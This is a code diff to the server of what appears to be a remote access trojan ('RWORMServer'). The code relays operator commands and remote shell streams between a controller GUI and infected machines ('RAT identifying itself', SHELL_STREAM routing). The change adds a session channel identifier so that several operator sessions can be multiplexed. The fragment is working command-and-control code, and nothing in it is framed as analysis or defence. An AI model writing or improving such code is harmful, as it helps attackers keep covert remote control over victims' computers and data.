@@ -97,7 +97,7 @@ class RWORMServer:
                 session.ram_percent = m.get('ram_percent', 0)
             except:
                 pass
-            self._forward_to_gui(session, t, packet.payload)
+            self._forward_to_gui(session, t, packet.payload, channel=packet.session_id)
             return
 
         if t == 0x02:   # SYSTEM_INFO — RAT identifying itself
@@ -133,12 +133,12 @@ class RWORMServer:
         is_rat = session.guid is not None
 
         if is_rat:
-            self._forward_to_gui(session, t, packet.payload)
+            self._forward_to_gui(session, t, packet.payload, channel=packet.session_id)
         else:
-            self._route_to_rat(session, t, packet.payload)
+            self._route_to_rat(session, t, packet.payload, channel=packet.session_id)
 
     # ─── Route GUI → RAT ─────────────────────────────────────────────────────
-    def _route_to_rat(self, gui_session: ClientSession, ptype: int, payload: bytes):
+    def _route_to_rat(self, gui_session: ClientSession, ptype: int, payload: bytes, channel: int = 0):
         """Parse guid\x00rest from payload, find RAT, forward rest."""
         try:
             raw = payload.decode('utf-8', errors='replace')
@@ -163,11 +163,11 @@ class RWORMServer:
             with self.shell_lock:
                 self.shell_routes[rat.id] = gui_session
 
-        pkt = Packet(ptype, rest)
+        pkt = Packet(ptype, rest, session_id=channel)
         rat.send(pkt.serialize())
 
     # ─── Forward RAT → GUI ────────────────────────────────────────────────────
-    def _forward_to_gui(self, rat_session: ClientSession, ptype: int, payload: bytes):
+    def _forward_to_gui(self, rat_session: ClientSession, ptype: int, payload: bytes, channel: int = 0):
         # Special case: SHELL_STREAM needs shell_routes lookup first
         if ptype == 0x22 and rat_session.guid:
             with self.shell_lock:
@@ -177,7 +177,7 @@ class RWORMServer:
                     gui = self.controllers.get(rat_session.id)
             if gui and rat_session.guid:
                 prefix = (rat_session.guid + '\x00').encode('utf-8')
-                gui.send(Packet(0x22, prefix + payload).serialize())
+                gui.send(Packet(0x22, prefix + payload, session_id=channel).serialize())
             return
 
         # All other RAT → GUI packets: prefix with guid\x00
@@ -194,7 +194,7 @@ class RWORMServer:
             return
 
         prefix  = (rat_session.guid + '\x00').encode('utf-8')
-        gui.send(Packet(ptype, prefix + payload).serialize())
+        gui.send(Packet(ptype, prefix + payload, session_id=channel).serialize())
 
     # ─── Helpers ─────────────────────────────────────────────────────────────
     def _broadcast_client_list(self):
